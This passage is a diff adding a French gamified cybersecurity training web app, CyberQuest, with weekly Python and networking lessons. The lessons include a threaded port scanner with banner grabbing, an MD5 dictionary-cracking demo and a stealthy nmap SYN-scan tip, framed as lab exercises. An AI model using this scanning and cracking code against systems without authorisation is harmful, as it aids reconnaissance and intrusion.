@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberQuest &mdash; Simon.JUTG&#201;</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Press+Start+2P&display=swap" rel="stylesheet">
+<style>
+
+:root{--bg:#080810;--bg2:#0d0d1a;--bg3:#12121f;--bg4:#1a1a2e;--border:#1e1e3a;--border2:#2a2a50;--text:#c8c8e8;--text2:#7070a0;--text3:#3a3a60;--cyan:#00f5ff;--cyan-dim:rgba(0,245,255,.08);--purple:#a855f7;--purple-dim:rgba(168,85,247,.1);--green:#39ff14;--green-dim:rgba(57,255,20,.08);--red:#ff3b3b;--red-dim:rgba(255,59,59,.1);--yellow:#ffd700;--yellow-dim:rgba(255,215,0,.08);--pixel:'Press Start 2P',monospace;--mono:'JetBrains Mono',monospace;--r:6px;--r2:10px;}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.06) 2px,rgba(0,0,0,.06) 4px);pointer-events:none;z-index:999}
+.hdr{position:sticky;top:0;z-index:200;background:rgba(8,8,16,.95);backdrop-filter:blur(8px);border-bottom:1px solid var(--border2);display:flex;align-items:center;justify-content:space-between;padding:0 1rem;height:52px}
+.hdr-logo{font-family:var(--pixel);font-size:8px;color:var(--cyan);line-height:1.6}
+.hdr-logo span{color:var(--purple)}
+.hdr-right{display:flex;align-items:center;gap:8px}
+.hdr-stat{font-size:11px;color:var(--text2)}
+.hdr-stat strong{color:var(--cyan)}
+.xp-chip{background:linear-gradient(135deg,var(--purple-dim),var(--cyan-dim));border:1px solid var(--border2);border-radius:99px;padding:3px 10px;font-size:9px;font-weight:700;color:var(--yellow);font-family:var(--pixel)}
+.api-btn{background:var(--bg3);border:1px solid var(--border2);border-radius:var(--r);color:var(--text2);font-family:var(--pixel);font-size:7px;padding:4px 8px;cursor:pointer;transition:all .15s}
+.api-btn:hover{color:var(--cyan);border-color:var(--cyan)}
+.api-btn.ok{color:var(--green);border-color:var(--green)}
+.screen{display:none}.screen.active{display:block}
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:500;display:none;align-items:center;justify-content:center;padding:1rem}
+.modal-overlay.show{display:flex}
+.modal{background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r2);padding:1.5rem;max-width:400px;width:100%}
+.modal h2{font-family:var(--pixel);font-size:9px;color:var(--cyan);margin-bottom:1rem;line-height:1.8}
+.modal p{font-size:12px;color:var(--text2);line-height:1.6;margin-bottom:1rem}
+.modal input{width:100%;background:var(--bg3);border:1px solid var(--border2);border-radius:var(--r);color:var(--text);font-family:var(--mono);font-size:12px;padding:.6rem .85rem;margin-bottom:.75rem;outline:none}
+.modal input:focus{border-color:var(--cyan)}
+.modal-btn{width:100%;padding:.7rem;border-radius:var(--r);border:1px solid var(--cyan);background:var(--cyan-dim);color:var(--cyan);font-family:var(--pixel);font-size:8px;cursor:pointer;margin-bottom:.5rem;transition:all .15s;line-height:1.8}
+.modal-btn.sec{border-color:var(--border2);color:var(--text2);background:transparent}
+.modal-link{font-size:10px;color:var(--text3);text-align:center;display:block;margin-top:.5rem}
+.modal-link a{color:var(--cyan);text-decoration:none}
+#map-screen{padding:1.25rem 1rem 4rem}
+.map-title{font-family:var(--pixel);font-size:10px;color:var(--cyan);line-height:2;text-align:center;margin-bottom:.4rem}
+.map-sub{font-size:11px;color:var(--text2);text-align:center;margin-bottom:1.5rem}
+.player-card{max-width:500px;margin:0 auto 1rem;background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r2);padding:1rem}
+.pc-top{display:flex;align-items:center;gap:12px;margin-bottom:10px}
+.pc-avatar{width:44px;height:44px;border-radius:var(--r);background:linear-gradient(135deg,var(--purple-dim),var(--cyan-dim));border:2px solid var(--purple);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
+.pc-name{font-family:var(--pixel);font-size:8px;color:var(--text);margin-bottom:3px}
+.pc-class{font-size:11px;color:var(--purple)}
+.pc-xpbar{height:4px;background:var(--bg4);border-radius:99px;overflow:hidden;margin-top:8px}
+.pc-xpfill{height:100%;border-radius:99px;background:linear-gradient(90deg,var(--purple),var(--cyan));transition:width .5s}
+.pc-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-top:10px}
+.pc-stat{background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);padding:6px;text-align:center}
+.pc-stat .v{font-family:var(--pixel);font-size:8px;color:var(--cyan);display:block}
+.pc-stat .l{font-size:9px;color:var(--text3);margin-top:2px;display:block}
+.streak-row{max-width:500px;margin:0 auto .85rem;display:flex;align-items:center;gap:10px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r2);padding:.65rem 1rem}
+.sr-num{font-family:var(--pixel);font-size:13px;color:#ff7700}
+.sr-dots{display:flex;gap:4px;margin-left:auto}
+.sdot{width:9px;height:9px;border-radius:50%;background:var(--bg4);border:1px solid var(--border2)}
+.sdot.on{background:#ff7700;border-color:#ff7700}
+.reset-link{max-width:500px;margin:0 auto .5rem;text-align:right}
+.reset-link button{background:transparent;border:none;color:var(--text3);font-family:var(--pixel);font-size:7px;cursor:pointer;padding:4px 0}
+.zones-wrap{max-width:600px;margin:0 auto}
+.zones-wrap h3{font-family:var(--pixel);font-size:7px;color:var(--text3);margin-bottom:.65rem;letter-spacing:.1em}
+.zones-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+.zone{background:var(--bg2);border:1px solid var(--border);border-radius:var(--r2);padding:.85rem;cursor:pointer;transition:all .15s;position:relative;overflow:hidden}
+.zone:hover{border-color:var(--border2);transform:translateY(-1px)}
+.zone-icon{font-size:20px;margin-bottom:6px}
+.zone-name{font-family:var(--pixel);font-size:7px;color:var(--text);margin-bottom:3px;line-height:1.6}
+.zone-desc{font-size:9px;color:var(--text3);margin-bottom:6px;line-height:1.5}
+.zone-bar{height:3px;background:var(--bg4);border-radius:99px;overflow:hidden;margin-bottom:4px}
+.zone-barfill{height:100%;border-radius:99px;transition:width .4s}
+.zone-meta{display:flex;justify-content:space-between;font-family:var(--pixel);font-size:7px}
+#zone-screen{padding:0}
+.zhdr{background:var(--bg2);border-bottom:1px solid var(--border);padding:.75rem 1rem;display:flex;align-items:center;gap:10px;position:sticky;top:52px;z-index:100}
+.back-btn{background:var(--bg3);border:1px solid var(--border2);border-radius:var(--r);color:var(--text2);font-family:var(--pixel);font-size:7px;padding:5px 10px;cursor:pointer;flex-shrink:0;transition:all .15s}
+.back-btn:hover{color:var(--cyan);border-color:var(--cyan)}
+.zh-title{font-family:var(--pixel);font-size:8px;color:var(--cyan);line-height:1.6}
+.zh-sub{font-size:10px;color:var(--text2);margin-top:2px}
+.weeks-wrap{padding:1rem;max-width:680px;margin:0 auto;padding-bottom:4rem}
+.month-block{margin-bottom:1.25rem}
+.mlabel{font-family:var(--pixel);font-size:7px;color:var(--text3);letter-spacing:.1em;margin-bottom:.55rem}
+.wklist{display:flex;flex-direction:column;gap:5px}
+.wkcard{background:var(--bg2);border:1px solid var(--border);border-radius:var(--r2);overflow:hidden;cursor:pointer;transition:all .15s}
+.wkcard:hover{border-color:var(--border2)}
+.wkcard.done{border-color:#1a3d1a;background:#080f08}
+.wkhdr{display:flex;align-items:center;gap:9px;padding:.7rem .9rem}
+.wk-num{width:26px;height:26px;border-radius:var(--r);display:flex;align-items:center;justify-content:center;font-family:var(--pixel);font-size:7px;border:1px solid currentColor;flex-shrink:0}
+.wk-info{flex:1;min-width:0}
+.wk-title{font-size:12px;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.wk-sub{font-size:10px;color:var(--text2);margin-top:1px}
+.wk-xp{font-family:var(--pixel);font-size:7px;color:var(--yellow);flex-shrink:0}
+.wk-ico{font-size:13px;flex-shrink:0}
+.wkbar{height:2px;background:var(--bg4)}
+.wkbarfill{height:100%;transition:width .3s}
+#lesson-screen{padding:0;min-height:100vh}
+.lhdr{background:var(--bg2);border-bottom:1px solid var(--border);padding:.75rem 1rem;display:flex;align-items:center;gap:10px;position:sticky;top:52px;z-index:100}
+.lh-title{font-family:var(--pixel);font-size:8px;color:var(--cyan);line-height:1.6;flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.ltabs{display:flex;gap:6px;padding:.65rem 1rem;background:var(--bg2);border-bottom:1px solid var(--border)}
+.ltab{flex:1;padding:7px;text-align:center;border-radius:var(--r);border:1px solid var(--border);background:var(--bg3);font-family:var(--pixel);font-size:7px;color:var(--text2);cursor:pointer;transition:all .15s;line-height:1.6}
+.ltab.on{border-color:var(--cyan);color:var(--cyan);background:var(--cyan-dim)}
+.ltab.locked{opacity:.35;cursor:not-allowed}
+.lbody{padding:1rem;max-width:660px;margin:0 auto;padding-bottom:5rem}
+.cblock{background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r2);padding:1.1rem;margin-bottom:.75rem}
+.cey{font-family:var(--pixel);font-size:7px;color:var(--purple);margin-bottom:.35rem;letter-spacing:.06em}
+.cbody{font-size:12px;color:var(--text2);line-height:1.7}
+.ccode{background:var(--bg);border:1px solid var(--border2);border-radius:var(--r);padding:.8rem 1rem;font-size:11px;color:var(--green);line-height:1.65;overflow-x:auto;white-space:pre;margin:.4rem 0;font-family:var(--mono)}
+.ctip{background:var(--yellow-dim);border-left:3px solid var(--yellow);border-radius:0 var(--r) var(--r) 0;padding:.55rem .8rem;font-size:11px;color:var(--text);margin:.4rem 0;line-height:1.6}
+.cwarn{background:var(--red-dim);border-left:3px solid var(--red);border-radius:0 var(--r) var(--r) 0;padding:.55rem .8rem;font-size:11px;color:var(--text);margin:.4rem 0;line-height:1.6}
+.clist{list-style:none;margin:.3rem 0}
+.clist li{font-size:12px;color:var(--text2);line-height:1.7;padding:.12rem 0 .12rem 1rem;position:relative}
+.clist li::before{content:'\25B8';position:absolute;left:0;color:var(--cyan)}
+.cres{margin-top:.65rem;display:flex;flex-wrap:wrap;gap:5px}
+.creslink{font-size:10px;padding:3px 8px;border-radius:var(--r);border:1px solid var(--border2);color:var(--cyan);background:var(--cyan-dim);text-decoration:none}
+.cta-go{display:block;width:100%;padding:.8rem;margin-top:.65rem;border-radius:var(--r2);border:2px solid var(--cyan);background:var(--cyan-dim);color:var(--cyan);font-family:var(--pixel);font-size:8px;cursor:pointer;transition:all .2s;text-align:center;line-height:1.8}
+.cta-go:hover{background:rgba(0,245,255,.2)}
+.qscore{background:var(--bg3);border:1px solid var(--border2);border-radius:var(--r2);padding:.8rem 1rem;display:flex;align-items:center;gap:11px;margin-bottom:.75rem}
+.qsico{font-size:18px;flex-shrink:0}
+.qsinfo{flex:1}
+.qslbl{font-family:var(--pixel);font-size:7px;color:var(--text2);margin-bottom:4px}
+.qstrk{height:5px;background:var(--bg4);border-radius:99px;overflow:hidden}
+.qsfill{height:100%;border-radius:99px;background:linear-gradient(90deg,var(--purple),var(--cyan));transition:width .4s}
+.qsnums{font-family:var(--pixel);font-size:7px;color:var(--cyan);margin-top:3px}
+.qloading{text-align:center;padding:2.5rem 1rem;font-family:var(--pixel);font-size:8px;color:var(--text2);line-height:2.2}
+.spinner{display:inline-block;width:22px;height:22px;border:2px solid var(--border2);border-top-color:var(--cyan);border-radius:50%;animation:spin .8s linear infinite;margin-bottom:.75rem}
+@keyframes spin{to{transform:rotate(360deg)}}
+.qcard{background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r2);padding:1rem;margin-bottom:.7rem}
+.qnum{font-family:var(--pixel);font-size:7px;color:var(--text3);margin-bottom:.35rem}
+.qbadge{font-family:var(--pixel);font-size:7px;padding:2px 7px;border-radius:3px;display:inline-block;margin-bottom:.55rem}
+.bqcm{color:var(--cyan);background:var(--cyan-dim);border:1px solid rgba(0,245,255,.2)}
+.btf{color:var(--purple);background:var(--purple-dim);border:1px solid rgba(168,85,247,.2)}
+.qquestion{font-size:13px;font-weight:600;color:var(--text);margin-bottom:.8rem;line-height:1.55}
+.choices{display:flex;flex-direction:column;gap:5px}
+.choice{display:flex;align-items:center;gap:8px;padding:.6rem .85rem;border:1px solid var(--border);border-radius:var(--r);cursor:pointer;transition:all .15s;font-size:12px;color:var(--text2);background:var(--bg3)}
+.choice:hover:not(.ans){border-color:var(--border2);color:var(--text)}
+.choice .cl{width:19px;height:19px;border-radius:3px;border:1px solid var(--border2);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-family:var(--pixel);font-size:7px;color:var(--text3)}
+.choice.correct{border-color:var(--green);color:var(--green);background:var(--green-dim)}
+.choice.correct .cl{background:var(--green);color:#000;border-color:var(--green)}
+.choice.wrong{border-color:var(--red);color:var(--red);background:var(--red-dim)}
+.choice.wrong .cl{background:var(--red);color:#fff;border-color:var(--red)}
+.choice.ans{cursor:default;pointer-events:none}
+.tf-wrap{display:grid;grid-template-columns:1fr 1fr;gap:7px}
+.tfbtn{padding:.75rem;border-radius:var(--r);border:1px solid var(--border);background:var(--bg3);cursor:pointer;text-align:center;font-family:var(--pixel);font-size:8px;color:var(--text2);transition:all .15s}
+.tfbtn:hover:not(.ans){border-color:var(--border2);color:var(--text)}
+.tfbtn.correct{border-color:var(--green);color:var(--green);background:var(--green-dim)}
+.tfbtn.wrong{border-color:var(--red);color:var(--red);background:var(--red-dim)}
+.tfbtn.ans{cursor:default;pointer-events:none}
+.qfb{margin-top:.6rem;padding:.5rem .75rem;border-radius:var(--r);font-size:11px;line-height:1.5;display:none}
+.qfb.show{display:block}
+.qfb.ok{background:var(--green-dim);border-left:3px solid var(--green);color:var(--green)}
+.qfb.ko{background:var(--red-dim);border-left:3px solid var(--red);color:var(--text)}
+.qfb .expl{color:var(--text2);margin-top:3px;font-size:11px}
+.cta-back{display:block;width:100%;padding:.8rem;margin-top:.7rem;border-radius:var(--r2);border:2px solid var(--purple);background:var(--purple-dim);color:var(--purple);font-family:var(--pixel);font-size:8px;cursor:pointer;transition:all .2s;text-align:center;line-height:1.8}
+.xppop{position:fixed;font-family:var(--pixel);font-size:11px;color:var(--yellow);pointer-events:none;z-index:900;animation:xpf 1.3s ease-out forwards}
+@keyframes xpf{0%{opacity:1;transform:translateY(0) scale(1)}100%{opacity:0;transform:translateY(-70px) scale(1.4)}}
+.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--bg3);border:1px solid var(--border2);border-radius:var(--r2);padding:9px 16px;font-family:var(--pixel);font-size:7px;color:var(--text);z-index:800;transition:transform .3s;white-space:nowrap;pointer-events:none;line-height:2;max-width:92vw;text-align:center}
+.toast.show{transform:translateX(-50%) translateY(0)}
+.cfp{position:fixed;width:7px;height:7px;border-radius:2px;top:-10px;animation:cff 1.8s ease-in forwards;z-index:700;pointer-events:none}
+@keyframes cff{0%{transform:translateY(0) rotate(0);opacity:1}100%{transform:translateY(100vh) rotate(720deg);opacity:0}}
+@media(max-width:480px){.zones-grid{grid-template-columns:1fr}.pc-stats{grid-template-columns:repeat(2,1fr)}}
+
+</style>
+</head>
+<body>
+<header class="hdr">
+  <div class="hdr-logo">CYBER<span>QUEST</span><br>Simon.JUTG&#201;</div>
+  <div class="hdr-right">
+    <div class="hdr-stat">&#128293;<strong id="hs">0</strong></div>
+    <div class="hdr-stat">&#x2705;<strong id="hd">0</strong></div>
+    <div class="xp-chip" id="hxp">0 XP</div>
+    <button class="api-btn" id="apibtn" onclick="showApiModal()">&#128273; API</button>
+  </div>
+</header>
+
+<div class="modal-overlay" id="apimodal">
+  <div class="modal">
+    <h2>&#128273; CL&#201; API GROQ</h2>
+    <p>Gratuite sur console.groq.com &mdash; inscription email, sans CB.</p>
+    <input type="password" id="apiinput" placeholder="gsk_..." />
+    <button class="modal-btn" onclick="saveKey()">&#128190; SAUVEGARDER</button>
+    <button class="modal-btn sec" onclick="closeApiModal()">ANNULER</button>
+    <span class="modal-link"><a href="https://console.groq.com/keys" target="_blank">Obtenir une cl&#233; Groq &#8594;</a></span>
+  </div>
+</div>
+
+<div class="modal-overlay" id="rmodal">
+  <div class="modal">
+    <h2 style="color:var(--red)">&#9888; RESET</h2>
+    <p>Efface toute la progression : XP, missions, streak, cl&#233; API.<br><br><span style="color:var(--red);font-size:11px">Action irr&#233;versible.</span></p>
+    <button class="modal-btn" style="border-color:var(--red);color:var(--red);background:var(--red-dim);margin-top:1rem" onclick="doReset()">&#128465; OUI &mdash; TOUT EFFACER</button>
+    <button class="modal-btn sec" onclick="closeReset()">ANNULER</button>
+  </div>
+</div>
+
+<div id="map-screen" class="screen active">
+  <div class="map-title">&#9876; CYBERQUEST &#9876;</div>
+  <div class="map-sub">52 semaines &middot; 6 zones &middot; QCM g&#233;n&#233;r&#233;s par IA</div>
+  <div class="player-card">
+    <div class="pc-top">
+      <div class="pc-avatar" id="pcav">&#128163;</div>
+      <div><div class="pc-name">SIMON.JUTG&#201;</div><div class="pc-class" id="pccls">Script Kiddie &middot; Nv.1</div></div>
+    </div>
+    <div class="pc-xpbar"><div class="pc-xpfill" id="pcxp" style="width:0%"></div></div>
+    <div class="pc-stats">
+      <div class="pc-stat"><span class="v" id="psxp">0</span><span class="l">XP</span></div>
+      <div class="pc-stat"><span class="v" id="psst">0&#128293;</span><span class="l">Streak</span></div>
+      <div class="pc-stat"><span class="v" id="psdn">0</span><span class="l">Missions</span></div>
+      <div class="pc-stat"><span class="v" id="pspct">0%</span><span class="l">Global</span></div>
+    </div>
+  </div>
+  <div class="streak-row">
+    <div class="sr-num" id="srnum">&#128293; 0</div>
+    <div style="font-size:10px;color:var(--text2)">jours cons&#233;cutifs</div>
+    <div class="sr-dots" id="srdots"></div>
+  </div>
+  <div class="reset-link"><button onclick="showReset()">&#x21BA; reset progression</button></div>
+  <div class="zones-wrap">
+    <h3>// CHOISIR UNE ZONE</h3>
+    <div class="zones-grid" id="zonesgrid"></div>
+  </div>
+</div>
+
+<div id="zone-screen" class="screen">
+  <div class="zhdr">
+    <button class="back-btn" onclick="goMap()">&#9664; MAP</button>
+    <div><div class="zh-title" id="zhtitle">&mdash;</div><div class="zh-sub" id="zhsub">&mdash;</div></div>
+  </div>
+  <div class="weeks-wrap" id="weekswrap"></div>
+</div>
+
+<div id="lesson-screen" class="screen">
+  <div class="lhdr">
+    <button class="back-btn" id="lbackbtn">&#9664; MAP</button>
+    <div class="lh-title" id="lhtitle">&mdash;</div>
+  </div>
+  <div class="ltabs">
+    <div class="ltab on" id="tcours" onclick="switchTab('cours')">&#128218; COURS</div>
+    <div class="ltab locked" id="tqcm" onclick="tryQCM()">&#127919; QCM IA</div>
+  </div>
+  <div class="lbody">
+    <div id="courscontent"></div>
+    <div id="qcmcontent" style="display:none"></div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+<script>
+var ZONES = [{"id": "python", "name": "PYTHON DUNGEON", "icon": "🐍", "color": "#00f5ff", "glow": "rgba(0,245,255,.05)", "desc": "Scripting, réseau, crypto · S1-S8", "weeks": [{"n": 1, "title": "Variables et types", "sub": "Bases du langage", "topics": ["str, int, float, bool, list, dict, tuple", "Opérateurs arithmétiques et comparaison", "f-strings et conversion de types", "Input utilisateur"], "code": "nom = 'Simon'\nport = 8080\nports = [22, 80, 443]\nprint(f'Bonjour {nom}, port={port}')", "tip": "En Python, l'indentation est la syntaxe. 4 espaces obligatoires.", "warn": null, "resources": [{"l": "Tuto Python FR", "u": "https://docs.python.org/fr/3/tutorial/"}]}, {"n": 2, "title": "Conditions et boucles", "sub": "Contrôle du flux", "topics": ["if / elif / else", "Boucles for et range()", "Boucle while et break/continue", "Opérateurs logiques"], "code": "ports = [21, 22, 80, 443]\nfor port in ports:\n    if port == 22:\n        print('SSH detecte !')\n    elif port in [80, 443]:\n        print(f'Web : {port}')", "tip": "range(1, 1025) génère les ports 1 à 1024.", "warn": null, "resources": [{"l": "Exercism Python", "u": "https://exercism.org/tracks/python"}]}, {"n": 3, "title": "Fonctions et modules", "sub": "Organiser son code", "topics": ["def, paramètres, return", "Valeurs par défaut", "import os, sys, pathlib", "Créer ses propres modules"], "code": "import os\n\ndef scanner(host, ports=[22,80,443]):\n    for p in ports:\n        print(f'Test {host}:{p}')\n    return len(ports)\n\nn = scanner('127.0.0.1')\nprint(f'{n} ports testés')", "tip": "Les docstrings documentent les fonctions. Indispensable en projet pro.", "warn": null, "resources": [{"l": "Docs Python", "u": "https://docs.python.org/fr/3/"}]}, {"n": 4, "title": "Fichiers et exceptions", "sub": "Lire, écrire, gérer les erreurs", "topics": ["open(), read(), write()", "Modes r, w, a", "try / except / finally", "raise pour lever des exceptions"], "code": "try:\n    with open('cibles.txt', 'r') as f:\n        for ligne in f:\n            print(f'Cible : {ligne.strip()}')\nexcept FileNotFoundError:\n    print('Fichier introuvable !')\nfinally:\n    print('Termine.')", "tip": "Toujours utiliser 'with open()' — ferme le fichier automatiquement.", "warn": null, "resources": [{"l": "Automate the Boring Stuff", "u": "https://automatetheboringstuff.com/"}]}, {"n": 5, "title": "Sockets réseau", "sub": "TCP, UDP et scanner de ports", "topics": ["socket.AF_INET, SOCK_STREAM", "Client TCP et timeout", "Scanner de ports avec connect_ex()", "Récupérer les bannières"], "code": "import socket\n\ndef scan_port(host, port, timeout=0.5):\n    try:\n        s = socket.socket()\n        s.settimeout(timeout)\n        result = s.connect_ex((host, port))\n        s.close()\n        return result == 0\n    except:\n        return False\n\nouverts = [p for p in range(1,1025) if scan_port('127.0.0.1', p)]\nprint('Ports ouverts :', ouverts)", "tip": null, "warn": "Ne jamais scanner sans autorisation. Uniquement sur 127.0.0.1 ou un lab VM.", "resources": [{"l": "Python socket", "u": "https://docs.python.org/3/library/socket.html"}]}, {"n": 6, "title": "Cryptographie", "sub": "hashlib, base64, secrets", "topics": ["base64 : encoder/décoder", "hashlib : MD5, SHA1, SHA256", "Module secrets pour tokens", "Attaque dictionnaire sur MD5"], "code": "import hashlib, base64\n\ndef hash_sha256(t):\n    return hashlib.sha256(t.encode()).hexdigest()\n\ncible = hashlib.md5(b'password').hexdigest()\nfor mot in ['admin','password','123456']:\n    if hashlib.md5(mot.encode()).hexdigest() == cible:\n        print(f'Trouve : {mot}')\n\nenc = base64.b64encode(b'Simon').decode()", "tip": "MD5 et SHA1 sont cassés pour les mots de passe. En prod : bcrypt ou Argon2.", "warn": null, "resources": [{"l": "hashlib docs", "u": "https://docs.python.org/3/library/hashlib.html"}]}, {"n": 7, "title": "Requests et scraping", "sub": "HTTP, APIs REST, BeautifulSoup", "topics": ["requests : GET, POST, headers", "Analyser les réponses JSON", "BeautifulSoup pour parser HTML", "User-Agent pour simuler un navigateur"], "code": "import requests\n\nresp = requests.get(\n    'https://services.nvd.nist.gov/rest/json/cves/2.0',\n    params={'keywordSearch':'python','resultsPerPage':3},\n    timeout=10\n)\nfor cve in resp.json().get('vulnerabilities',[]):\n    print(cve['cve']['id'])", "tip": "pip install requests beautifulsoup4 — les 2 modules les plus utilisés en Python cyber.", "warn": null, "resources": [{"l": "Requests docs", "u": "https://docs.python-requests.org/"}]}, {"n": 8, "title": "Projet Network Scanner", "sub": "Assembler toutes les compétences", "topics": ["Architecture en modules séparés", "Port scanner multi-threadé", "Grab de bannières des services", "Rapport HTML auto-généré", "GitHub avec README et docstrings"], "code": "import concurrent.futures, socket\n\ndef grab_banner(host, port):\n    try:\n        s = socket.socket()\n        s.settimeout(1)\n        s.connect((host, port))\n        s.send(b'HEAD / HTTP/1.0\\r\\n\\r\\n')\n        return s.recv(256).decode(errors='ignore')[:80]\n    except: return ''\n\ndef full_scan(host):\n    ports = range(1, 1025)\n    with concurrent.futures.ThreadPoolExecutor(100) as ex:\n        open_ports = [p for p,ok in zip(ports,\n            ex.map(lambda p:scan_port(host,p),ports)) if ok]\n    return {p: grab_banner(host,p) for p in open_ports}", "tip": "Ce projet sur GitHub est exactement ce que les recruteurs cyber regardent.", "warn": null, "resources": [{"l": "GitHub Student Pack", "u": "https://education.github.com/pack"}]}]}, {"id": "reseau", "name": "NETWORK FORTRESS", "icon": "🌐", "color": "#00b4d8", "glow": "rgba(0,180,216,.05)", "desc": "TCP/IP, Cisco, Wireshark, VLAN · S5-S16", "weeks": [{"n": 1, "title": "Modèle OSI", "sub": "Les 7 couches du réseau", "topics": ["7 couches OSI : rôle et protocoles", "Encapsulation et désencapsulation", "Modèle TCP/IP 4 couches vs OSI", "Mémoriser les couches"], "code": "# Couches OSI de bas en haut :\n# 1 Physique     : cables, Wi-Fi\n# 2 Liaison      : Ethernet, switch, MAC\n# 3 Réseau       : IP, routeur\n# 4 Transport    : TCP, UDP, ports\n# 5 Session      : gestion sessions\n# 6 Présentation : chiffrement\n# 7 Application  : HTTP, DNS, FTP, SSH", "tip": "Mémo : Peut-on Résoudre les Trames Sans Peine Absolument ? (Physique vers Application)", "warn": null, "resources": [{"l": "Cisco Netacad", "u": "https://www.netacad.com/"}]}, {"n": 2, "title": "Adressage IPv4", "sub": "Sous-réseaux et CIDR", "topics": ["Adresse IP : 4 octets, 32 bits", "Masque CIDR /24", "Plages privées RFC 1918", "Calculer réseau, broadcast, hôtes"], "code": "# RFC 1918 - plages privées :\n# 10.0.0.0/8       : 16 777 214 hôtes\n# 172.16.0.0/12    : 1 048 574 hôtes\n# 192.168.0.0/16   : 65 534 hôtes\n\n# Exemple 192.168.1.0/24 :\n# Masque    : 255.255.255.0\n# Premier   : 192.168.1.1\n# Dernier   : 192.168.1.254\n# Broadcast : 192.168.1.255", "tip": "ipcalc (Linux) calcule automatiquement les sous-réseaux.", "warn": null, "resources": [{"l": "Subnet Calculator", "u": "https://www.subnet-calculator.com/"}]}, {"n": 3, "title": "TCP et handshake", "sub": "Protocole de transport fiable", "topics": ["TCP vs UDP : garanties et usages", "SYN, SYN-ACK, ACK", "Numéros de séquence", "Fermeture FIN, FIN-ACK, ACK"], "code": "# 3-way handshake TCP :\nClient -- SYN -----------> Serveur\nClient <-- SYN-ACK ------- Serveur\nClient -- ACK -----------> Serveur\n      [Connexion établie]\n\n# Ports importants :\n# 22 SSH | 80 HTTP | 443 HTTPS\n# 53 DNS | 21 FTP  | 3306 MySQL", "tip": "nmap -sS envoie un SYN sans terminer le handshake — plus discret.", "warn": null, "resources": [{"l": "THM Intro Networking", "u": "https://tryhackme.com/room/introtonetworking"}]}, {"n": 4, "title": "Wireshark", "sub": "Analyser le trafic réseau", "topics": ["Interface Wireshark : capture en temps réel", "Filtres : ip.addr, tcp.port, http, dns", "Analyser un échange HTTP et DNS", "Détecter un scan nmap dans une capture"], "code": "# Filtres Wireshark essentiels :\nip.addr == 192.168.1.1\ntcp.port == 80\nhttp\ndns\nudp.port == 53\ntcp.flags.syn == 1\ntcp.flags.syn==1 and tcp.flags.ack==0\nhttp.request.method == POST", "tip": "File > Export Objects > HTTP permet d'extraire les fichiers transférés en clair.", "warn": null, "resources": [{"l": "Wireshark Docs", "u": "https://www.wireshark.org/docs/"}]}, {"n": 5, "title": "DNS et DHCP", "sub": "Infrastructure réseau de base", "topics": ["DNS : types A, AAAA, MX, CNAME, TXT", "Chaîne de résolution DNS récursive", "DHCP : DORA (Discover, Offer, Request, ACK)", "dig et nslookup pour interroger le DNS"], "code": "# Interroger le DNS avec dig :\ndig example.com A\ndig example.com MX\ndig example.com TXT\ndig +trace example.com\n\n# DHCP DORA :\n# 1. Discover : broadcast\n# 2. Offer    : serveur propose IP\n# 3. Request  : client accepte\n# 4. ACK      : serveur confirme", "tip": "dig +short example.com = réponse minimaliste. Très utile en OSINT.", "warn": null, "resources": [{"l": "MXToolbox", "u": "https://mxtoolbox.com/"}]}, {"n": 6, "title": "Cisco IOS", "sub": "CLI switch et routeur", "topics": ["Modes IOS : User, Privileged, Config", "show version, show interfaces, show ip route", "Configurer une interface et no shutdown", "copy running-config startup-config"], "code": "Switch> enable\nSwitch# configure terminal\nSwitch(config)# hostname SW-LAB\nSwitch(config)# interface gi0/1\nSwitch(config-if)# description PC-Simon\nSwitch(config-if)# no shutdown\nSwitch(config-if)# exit\nSwitch# copy running-config startup-config", "tip": "Cisco Packet Tracer (gratuit via Netacad) simule des réseaux sans matériel.", "warn": null, "resources": [{"l": "Packet Tracer", "u": "https://www.netacad.com/courses/packet-tracer"}]}, {"n": 7, "title": "VLANs", "sub": "Segmentation logique", "topics": ["VLAN : isoler des groupes sans câble", "Créer et nommer des VLANs en IOS", "Ports access (1 VLAN) vs trunk (multi)", "Standard 802.1Q et tagging"], "code": "Switch(config)# vlan 10\nSwitch(config-vlan)# name COMPTA\nSwitch(config)# vlan 20\nSwitch(config-vlan)# name INFORMATIQUE\n\n# Port access :\nSwitch(config-if)# switchport mode access\nSwitch(config-if)# switchport access vlan 10\n\n# Port trunk :\nSwitch(config-if)# switchport mode trunk", "tip": "Les VLANs limitent la propagation des attaques entre segments.", "warn": null, "resources": [{"l": "Cisco VLAN", "u": "https://www.cisco.com/"}]}, {"n": 8, "title": "ACL et sécurité réseau", "sub": "Filtrer et contrôler le trafic", "topics": ["ACL standard vs étendue sur Cisco", "access-list 101 permit/deny", "Appliquer une ACL sur une interface", "Détecter anomalies avec Wireshark"], "code": "Router(config)# access-list 101 permit tcp any any eq 80\nRouter(config)# access-list 101 permit tcp any any eq 443\nRouter(config)# access-list 101 deny ip any any log\n\nRouter(config)# interface serial0/0\nRouter(config-if)# ip access-group 101 in\n\nRouter# show access-lists 101", "tip": null, "warn": "Une ACL mal configurée peut bloquer tout le trafic. Toujours tester en lab Packet Tracer.", "resources": [{"l": "Cisco ACL", 